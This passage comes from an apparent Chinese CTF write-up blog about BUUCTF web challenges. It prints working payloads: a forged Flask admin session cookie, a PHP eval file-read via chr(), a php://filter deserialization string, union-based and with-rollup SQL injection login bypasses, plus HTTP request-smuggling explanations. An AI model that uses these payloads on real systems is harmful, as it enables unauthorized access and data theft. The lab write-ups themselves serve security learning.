class="line-numbers-rows"><span></span></span></code></pre><h2 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h2><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p>这里直接读取cookie处的session，拿p师傅的脚本解密</p><p><img src="image-20210622152837055.png" alt="image-20210622152837055"></p><pre class="line-numbers language-session"><code class="language-session">{'_fresh': True, '_id': b'de1a76fa41b201f9691b499189fc182a9ada3c2670f72a06694707d999c69a4877e2c0bece2a6598d30bdfa836af05959fee422f1574fbb1e1f2484f2cac79c3', 'csrf_token': b'7e73a86d3a5d5bf8e0c46793afe6bdf67f0af005', 'image': b'KsAf', 'name': 'admin', 'user_id': '1'}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我已经以admin身份登录了，所以拿到了admin的session</p><p><img src="image-20210622153430038.png" alt="image-20210622153430038"></p><p>这里将session中的name小写，和username比较，相同则登录，那么我们就可以将name字段改为admin，然后加密</p><p>加密脚本也用现成的</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p><img src="image-20210622160918389.png" alt="image-20210622160918389"></p><pre class="line-numbers language-session"><code class="language-session">.eJw9kEGPgjAQRv_KZs4chLoXEw8SoFmSDsEUyPRiWEWhUDcBDVrjf9-um3idl7y8bx6wO47N1MLqMl4bD3bdAVYP-PiGFWRy26MuBxGFRmmyqIsbShGg3g5o2y6TtCC5X6ApjZAnJmzYqUoNJMteycSgjhlauqlK-EoWjGSiFf9aKrmxKPcsk9giLxboblkkHBd3pVNNJvaR5zfBBUNNTFT5kozqSLeup_gk58QontFu7hQIm_F4DU8P9tN43F1--ub8noBBwUQQL9Hk9i8Lq9RkvJjJ5gHa3pLLRZP2bh5TOmyV3syYr1-6ztSn5m0iliR0-ifn2jgA9cF0Z_DgOjXj62_g-_D8BYRPbTo.YNGaow.2-AM-dVZnD6rMuQ9wuD6tx2USOM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210622161022002.png" alt="image-20210622161022002"></p><p>成功</p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>思路大概没问题，但….没有人将它复现成功（起码我没找到）</p><p>直接贴思路</p><p>参考链接：</p><p><a href="https://www.jianshu.com/p/f92311564ad0">https://www.jianshu.com/p/f92311564ad0</a></p><p>仔细观察源码，可以发现login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值</p><p><img src="https://upload-images.jianshu.io/upload_images/11525934-ca19be16b307ed43.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/721/format/webp" alt="img"></p><p>我们可以这样设想，一个进程以正常账号一直依次进行登录、改密码操作，另一个进程同时一直依次进行注销、以admin用户名加进程1更改的新密码进行登录。就有可能出现当进程1进行到改密码函数时，进程2进行到登录操作，这个时候进程1需要从session中取出name，而进程2此时把session[‘name’]改成了admin。</p><p>所以就可以编写脚本进行条件竞争，条件竞争结束的标志为进程2登录操作成功，即重定向到<code>/index</code>。</p><h2 id="非预期：username覆盖"><a href="#非预期：username覆盖" class="headerlink" title="非预期：username覆盖"></a>非预期：username覆盖</h2><p>注测用户名admin%20 便可以覆盖原来的admin用户</p><p>然后登录即可拿到flag</p><p>非预期就挺无趣的，但前三种解法值得学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF ———— two</title>
      <link href="/2021/06/14/BUUCTF-two/"/>
      <url>/2021/06/14/BUUCTF-two/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-：-二"><a href="#BUUCTF-：-二" class="headerlink" title="BUUCTF  ： 二"></a>BUUCTF  ： 二</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="vardump-scandir-与chr"><a href="#vardump-scandir-与chr" class="headerlink" title="vardump(),scandir()与chr()"></a>vardump(),scandir()与chr()</h3><p>根据提示，直接入calc.php文件，发现不能传num</p><p>wp说因为上了waf，不允许上传num,所以要使用?+num</p><p>查看phpinfo()，发现函数禁用的很严，所以考虑蚁剑绕过或者函数执行</p><p>这里有两种思路，先说第一种</p><p>eval可以执行函数</p><p>scandir()函数用于列出一个目录下的所有文件和目录</p><p>var_dump()函数将所得内容变为数组，可以让eval中的echo 不会报错</p><p>chr()可以绕过正则匹配，输出特殊符号</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span> num<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210615163731026.png" alt="image-20210615163731026"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{03b267fb-8fd1-44a3-a535-bcd08f8826fb} <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="思路二：HTTP请求走私"><a href="#思路二：HTTP请求走私" class="headerlink" title="思路二：HTTP请求走私"></a>思路二：HTTP请求走私</h3><p>原文地址</p><p><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></p><p>HTTP 请求走私是一种干扰网站处理从一个或多个用户收到的 HTTP 请求序列方式的技术。请求走私漏洞在本质上通常很关键，允许攻击者绕过安全控制，未经授权访问敏感数据，并直接危害其他应用程序用户。</p><h4 id="HTTP请求走私漏洞是如何产生的？"><a href="#HTTP请求走私漏洞是如何产生的？" class="headerlink" title="HTTP请求走私漏洞是如何产生的？"></a>HTTP请求走私漏洞是如何产生的？</h4><p>大多数 HTTP 请求走私漏洞的出现是因为 HTTP 规范提供了两种不同的方式来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p><p>该<code>Content-Length</code>头是直接的：它指定消息体的以字节为单位的长度。例如：</p><pre class="line-numbers language-http"><code class="language-http">POST /search HTTP/1.1<span class="token header-name keyword">Host:</span> normal-website.com<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 11q=smuggling<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该<code>Transfer-Encoding</code>首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块由以字节为单位的块大小（以十六进制表示）、后跟换行符和块内容组成。消息以大小为零的块终止。例如：</p><pre class="line-numbers language-http"><code class="language-http">POST /search HTTP/1.1<span class="token header-name keyword">Host:</span> normal-website.com<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Transfer-Encoding:</span> chunkedbq=smuggling0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 HTTP 规范提供了两种不同的方法来指定 HTTP 消息的长度，因此单个消息可能会同时使用这两种方法，从而导致它们相互冲突。HTTP 规范试图通过声明如果<code>Content-Length</code>和<code>Transfer-Encoding</code>标头都存在，<code>Content-Length</code>则应忽略标头来防止此问题。当只有一个服务器在运行时，这可能足以避免歧义，但当两个或多个服务器链接在一起时则不然。在这种情况下，出现问题的原因有两个：</p><ul><li>某些服务器不支持<code>Transfer-Encoding</code>请求中的标头。</li><li><code>Transfer-Encoding</code>如果标头以某种方式被混淆，一些 支持标头的服务器可能会被诱导不处理它。</li></ul><p>如果前端和后端服务器在（可能被混淆的）<code>Transfer-Encoding</code> 标头方面的行为不同，那么它们可能会在连续请求之间的边界上存在分歧，从而导致请求走私漏洞。</p><p>请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code> 标头放入单个 HTTP 请求并对其进行操作，以便前端和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL.TE：前端服务器使用<code>Content-Length</code>头部，后端服务器使用<code>Transfer-Encoding</code>头部。</li><li>TE.CL：前端服务器使用<code>Transfer-Encoding</code>头部，后端服务器使用<code>Content-Length</code>头部。</li><li>TE.TE：前端和后端服务器都支持<code>Transfer-Encoding</code>头部，但可以通过某种方式混淆头部来诱导其中一个服务器不处理它。</li></ul><p>本题所有的方法都可以用</p><p>先发送一个POST</p><p><img src="image-20210616151512591.png" alt="image-20210616151512591"></p><p>确认存在，然后直接构造请求</p><p><img src="image-20210616151714993.png" alt="image-20210616151714993"></p><p><img src="image-20210616151738397.png" alt="image-20210616151738397"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>这里懒得扫，看了眼wp，访问index.php.bak即可</p><p><img src="image-20210619122452686.png" alt="image-20210619122452686"></p><h3 id="php弱等于特性"><a href="#php弱等于特性" class="headerlink" title="php弱等于特性"></a>php弱等于特性</h3><p>计算机语言的等号分三种 =   ==   ===</p><p>一个等于是赋值，重点再两个和三个上</p><p>=== 是强等于，只有强等于两边的变量完全一致时（数值，类型）返回对</p><p>== 是弱等于，在比较字符和数字时，会将字符先转换为数字，再比较</p><p>这里if语句使用了弱等于，所以实际是比较了 $key == 123</p><p>get 传参123即可</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?key=123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210619122622482.png" alt="image-20210619122622482"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{56416317-b54a-4ed5-8530-243719543ec0}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><h3 id="强等于绕过"><a href="#强等于绕过" class="headerlink" title="强等于绕过"></a>强等于绕过</h3><p>第一步没什么好说的，就看观察的够不够仔细</p><p><img src="image-20210624135703152.png" alt="image-20210624135703152"></p><p>这里在结束脚本时将op重新赋值为一，但使用的是强等于，并且1用双引号包裹，故这里的1为str</p><p>往上看</p><p><img src="image-20210624135826246.png" alt="image-20210624135826246"></p><p>类中对op的比较，使用的是弱等于</p><p>所以只需要将op赋值为int 2即可</p><p><img src="image-20210624140102908.png" alt="image-20210624140102908"></p><p><img src="image-20210624140156077.png" alt="image-20210624140156077"></p><p>成功绕过</p><h3 id="基于php7以上对类型的不敏感绕过字符限制"><a href="#基于php7以上对类型的不敏感绕过字符限制" class="headerlink" title="基于php7以上对类型的不敏感绕过字符限制"></a>基于php7以上对类型的不敏感绕过字符限制</h3><p><img src="image-20210624140317864.png" alt="image-20210624140317864"></p><p>is_valid函数限制了输入的字符ascii范围，而protected类型和provate类型在序列化时会生成不可见字符，这些字符是超出范围的</p><p>对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。</p><p><img src="image-20210624140932629.png" alt="image-20210624140932629"></p><p><img src="image-20210624140949731.png" alt="image-20210624140949731"></p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210624141046524.png" alt="image-20210624141046524"></p><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{98dce919-5a41-4e00-8266-6644e2d6a67b}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>各种角度都很无聊的一道题</p><p>心累了，毁灭吧，赶紧的</p><h3 id="order-by-比较盲注（假）"><a href="#order-by-比较盲注（假）" class="headerlink" title="order by 比较盲注（假）"></a>order by 比较盲注（假）</h3><p>源码告诉我们注入位置</p><p><img src="image-20210624165640871.png" alt="image-20210624165640871"></p><p>解码这串字符串，告诉我们是单引号闭合</p><p><img src="image-20210624165741313.png" alt="image-20210624165741313"></p><p>先base32再base64,但不解码同样试的出来</p><p>然后burp爆破模块测试过滤</p><p><strong><img src="image-20210624170018142.png" alt="image-20210624170018142"></strong></p><p>嗯，括号，明显是order by比较盲注</p><p>不过这里同样过滤了or，测试一下</p><p><img src="image-20210624170139146.png" alt="image-20210624170139146"></p><p>可以大小写绕过，那么接下来就是写脚本了</p><p>然而，写个锤子，跑一半就崩溃</p><p><img src="image-20210624170637269.png" alt="image-20210624170637269"></p><p>直接抄wp，有兴趣的朋友自己写吧，倦了</p><p>骗你的，比较个鬼</p><h3 id="逻辑漏洞，union-联合绕过"><a href="#逻辑漏洞，union-联合绕过" class="headerlink" title="逻辑漏洞，union 联合绕过"></a>逻辑漏洞，union 联合绕过</h3><p>可能order by的确是种方法，但当我看了wp，我想打出题人</p><p><img src="image-20210624172707285.png" alt="image-20210624172707285"></p><p>wp是这么说的，让我万分好奇，啥情况？咋绕的？盲注出md5然后登录？</p><p>本这好奇心一定要满足的原则，我找了本题的源代码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token keyword">Do</span> you know who am I<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 去除转义</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">stripslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span>        <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_GET</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_COOKIE</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_REQUEST</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'stripslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">'SET NAMES UTF8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t_pw</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// echo $sql;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\(|\)|\=|or/"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"do not hack me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error: %s\n"</span><span class="token punctuation">,</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// echo '</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span>        <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// print_r($arr);</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"wrong pass!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"wrong user!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我来分析一下</p><p><img src="image-20210624173041131.png" alt="image-20210624173041131"></p><p>先用username怼数据库理把数据拿出来</p><p>然后(!$result)看看数据是否真的拿出来了，没拿出来给你个报错(有报错虽好，可惜没卵用)</p><p>接着看看输入的name是不是admin，如果是，再比较password值的MD5是否等于数据库里存的md5</p><p>看着是没问题，但是</p><p>正常人谁把数据提出来才比较</p><p>那么这里就有一个逻辑漏洞</p><p>我们不需要明确知道密码，我们只需要让我们输入的密码md5值确实存在于数据库里</p><p>于是这里回归了那些感觉不清不楚的wp</p><pre class="line-numbers language-payload"><code class="language-payload">name=1' union select 0,'admin','e10adc3949ba59abbe56e057f20f883e' %23 &pw=123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是wp中的payload,看似的确是union伪造了身份，但是</p><p>根本不是，这是逻辑漏洞</p><p>当<code>name=1&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39; %23</code>时，<code>$result</code>得到了一个虚拟表</p><p><img src="image-20210624174714436.png" alt="image-20210624174714436"></p><p>就像这样，这个代码实际得到的，是这样的数组</p><p>然后开始比较，<code>$arr[1]=admin</code>，也就是虚拟表第二列值要为admin</p><p><code>$arr[2]=md5(password)</code>,虚拟表第三列值为password的MD5值</p><p><strong>漏洞来了，这个password，不是数据库里的password，而是我们输入的pw</strong></p><p><strong>只要我们输入的pw值在md5后和虚拟表中的password相等，就可以拿到flag,根本不需要知道真正的密码</strong></p><p>wp中用烂的payload,真正告诉我们的是这个意思</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>那么知道了原理，我们甚至可以这么构造</p><pre class="line-numbers language-payload"><code class="language-payload">name=1' union select 0,'admin','6eea9b7ef19179a06954edd0f6c05ceb' %23 &pw=qwertyuiop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210624175619363.png" alt="image-20210624175619363"></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{d56882af-5da5-48db-a589-e8ae11e5189f}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能我不该说出题人不对，或许出题人就是在这么考呢，没猜到源代码逻辑是我不对（确信）</p><h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><h2 id="with-rollup注入"><a href="#with-rollup注入" class="headerlink" title="with rollup注入"></a>with rollup注入</h2><p><img src="image-20211029133357488.png" alt="image-20211029133357488"></p><p>经典登录，就是不知道怎么进去</p><h3 id="猜测sql语句"><a href="#猜测sql语句" class="headerlink" title="猜测sql语句"></a>猜测sql语句</h3><p>sql注入先猜测语句</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正常思路先建立连接</span><span class="token variable">$que</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from user where username='admin' and password='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*这里应该对单引号做了过滤*/</span><span class="token comment" spellcheck="true">//题目有个安全提问答案，但测试并不能sql注入，这在ctf中不合理，所以猜测语句应该是</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$que</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 读取数据</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$POST</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 用读到的数据匹配token,对则登录成功</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这只是我个人的判断，对不对还需要继续验证</p><p>首先查看源码有个注册页面，注入一个用户名密码回答都为111的用户</p><p><img src="image-20211029145744873.png" alt="image-20211029145744873"></p><p>登录状态如图</p><p>然后构造语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span> <span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+';</span><span class="token comment" spellcheck="true">// 这里用户名变成了\' and password 后面拼接了|| 1=1 --+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211029150430124.png" alt="image-20211029150430124"></p><p>本地测试通过</p><p><img src="image-20211029150711496.png" alt="image-20211029150711496"></p><p>远程回显数据异常，说明这个想法可行</p><h3 id="with-rollup-语句"><a href="#with-rollup-语句" class="headerlink" title="with rollup 语句"></a>with rollup 语句</h3><p>后面的<code>$res[&#39;token&#39;] == $POST[&#39;token&#39;]</code></p><p>学长给了我一个思路</p><p>参考链接<code>https://www.cnblogs.com/20175211lyz/p/12285279.html</code></p><p>sql中group by语句后可以跟with rollup 语句，作用类似于Exceal表格中的汇总</p><p><img src="image-20211029152430089.png" alt="image-20211029152430089"></p><p>然后另一篇文章<code>https://www.anquanke.com/post/id/194640#h3-6</code>写到</p><p><img src="image-20211029152601497.png" alt="image-20211029152601497"></p><p>sql中having和where都是用来筛选的</p><p>having是用来筛选组，where是用来筛选记录，通俗点讲：where搜索条件在分组操作之前应用，having搜索条件在进行分组操作之后应用</p><p><img src="image-20211029153024515.png" alt="image-20211029153024515"></p><p>那我们的攻击语句就可以这么写</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span><span class="token operator">||</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">group</span> <span class="token keyword">by</span> token <span class="token keyword">with rollup</span> <span class="token keyword">having</span> token <span class="token operator">is</span> <span class="token boolean">null</span><span class="token comment" spellcheck="true">--+';</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211029154813985.png" alt="image-20211029154813985"></p><p>登录成功</p><h3 id="访问恶意mysql服务器读取文件"><a href="#访问恶意mysql服务器读取文件" class="headerlink" 